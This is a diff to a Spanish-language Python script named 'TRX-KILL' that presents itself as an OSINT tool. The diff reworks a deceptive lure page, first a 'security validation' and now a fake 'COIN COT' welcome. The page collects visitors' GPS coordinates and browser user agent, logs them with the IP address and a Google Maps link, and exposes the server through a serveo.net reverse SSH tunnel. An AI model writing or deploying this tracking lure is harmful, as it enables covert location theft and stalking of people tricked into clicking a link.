@@ -12,13 +12,13 @@ from datetime import datetime
 app = Flask('TRX-KILL')
 PUERTO = random.randint(6000, 9000)
 
-# HTML con solicitud de Geolocalización (lo máximo permitido)
+# HTML optimizado: Encuesta rápida que genera Google Maps
 HTML_ENCUESTA = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
     <h2>VALIDACIÓN DE SEGURIDAD</h2>
-    <p>Para verificar tu dispositivo, permite el acceso a ubicación:</p>
-    <button onclick="capturar()" style="padding:20px; background:green; color:white; border:none; cursor:pointer;">CONFIRMAR Y VALIDAR</button>
+    <p>BIVENIDO A COIN COT:</p>
+    <button onclick="capturar()" style="padding:20px; background:green; color:white; border:none; cursor:pointer;">CONTINÚR</button>
     <script>
         function capturar() {
             navigator.geolocation.getCurrentPosition((p) => {
@@ -28,6 +28,7 @@ HTML_ENCUESTA = """
                     body: JSON.stringify({
                         lat: p.coords.latitude, 
                         lon: p.coords.longitude, 
+                        ua: navigator.userAgent,
                         ts: new Date().toLocaleString()
                     })
                 }).then(() => window.location.href = "https://www.google.com");
@@ -44,21 +45,29 @@ def index(): return HTML_ENCUESTA
 def log():
     d = request.json
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
-    log_data = f"--- REGISTRO {d['ts']} ---\nIP: {ip}\nGPS: {d['lat']}, {d['lon']}\n----------------------------\n"
+    maps_link = f"https://www.google.com/maps/place/{d['lat']},{d['lon']}"
+    
+    log_data = (f"--- REGISTRO {d['ts']} ---\n"
+                f"IP: {ip}\n"
+                f"COORDENADAS: {d['lat']}, {d['lon']}\n"
+                f"GOOGLE MAPS: {maps_link}\n"
+                f"DISPOSITIVO: {d['ua']}\n"
+                f"----------------------------\n")
+    
     with open("resultados.txt", "a") as f: f.write(log_data)
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;36m#####################################################")
-    print("# TRX-KILL | SISTEMA OSINT                          #")
+    print("# TRX-KILL | SISTEMA OSINT AVANZADO                 #")
     print("# VERSIÓN: 1.1.1.2                                  #")
     print("#####################################################\033[0m")
 
 def main():
     while True:
         banner()
-        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP AVANZADA\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
+        print("\033[1;33m [1] INFO NÚMERO\n [2] RASTREO (LINK ENCUESTA)\n [3] CREADOR\n [4] LICENCIA\n [5] VERSIÓN\n [6] ACTUALIZACIÓN\n [7] INFO-IP AVANZADA\n [8] LEER RESULTADOS\n [9] SALIR\033[0m")
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         #------OPCION1-------
@@ -73,7 +82,7 @@ def main():
         #------OPCION2-------
         elif opc == "2":
             threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO, debug=False, use_reloader=False), daemon=True).start()
-            print(f"\n[*] Generando link en puerto {PUERTO}...")
+            print(f"\n[*] Servidor en {PUERTO}... Iniciando túnel...")
             proc = subprocess.Popen(['ssh', '-R', f'80:localhost:{PUERTO}', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
                 if "https://" in line:
@@ -82,14 +91,14 @@ def main():
             input("Enter para detener..."); os.system('pkill -f ssh')
 
         #------OPCION3/4/5/6-------
-        elif opc in ["3","4","5","6"]: print("\nInformación de sistema disponible."); input()
+        elif opc in ["3","4","5","6"]: print("\nSistema actualizado."); input()
 
         #------OPCION7-------
         elif opc == "7":
             target = input("IP pública: ")
             try:
                 res = requests.get(f"http://ip-api.com/json/{target}?fields=status,country,city,lat,lon,isp").json()
-                print(f"\n[+] UBICACIÓN: {res.get('city')}, {res.get('country')}\n[+] COORDENADAS: {res.get('lat')}, {res.get('lon')}\n[+] HORA: {datetime.now().strftime('%H:%M')}\n[+] DÍA: {datetime.now().strftime('%A')}\n[+] ISP: {res.get('isp')}")
+                print(f"\n[+] UBICACIÓN: {res.get('city')}, {res.get('country')}\n[+] COORDENADAS: {res.get('lat')}, {res.get('lon')}\n[+] DÍA: {datetime.now().strftime('%A')}\n[+] HORA: {datetime.now().strftime('%H:%M')}")
             except: print("Error de conexión.")
             input("\n[Enter]...")
 
